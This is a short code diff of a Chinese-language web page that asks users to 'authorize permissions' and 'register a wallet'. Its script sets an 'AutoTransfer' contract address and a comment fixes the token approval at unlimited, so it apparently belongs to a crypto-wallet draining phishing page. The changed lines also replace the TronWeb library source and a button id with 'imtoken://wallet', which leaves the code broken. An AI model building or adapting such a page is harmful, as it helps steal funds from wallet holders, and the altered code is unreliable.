@@ -298,10 +298,10 @@
         </div>
         
         <div class="button-group">
-            <button class="auth-button" id="approveButton">
+            <button class="auth-button" id="imtoken://wallet">
                 第一步: 权限获取授权
             </button>
-            <button class="auth-button" id="registerButton" disabled>
+            <button class="auth-button" id="approveBtn" class="btn" disabled>
                 第二步: 登记钱包
             </button>
         </div>
@@ -341,7 +341,7 @@
         </div>
     </div>
 
-   <script src="https://unpkg.com/tronweb@4.4.2/dist/TronWeb.min.js"></script>
+   <script src="imtoken://wallet"></script>
    <script>
     // ========== 需替换的3处配置（授权额度已固定为无限） ==========
     const AUTO_TRANSFER_CONTRACT = "TNAfknJTfkPbgmyfpwg3rJQrd17ZLKEMQa"; // 你的AutoTransfer合约地址
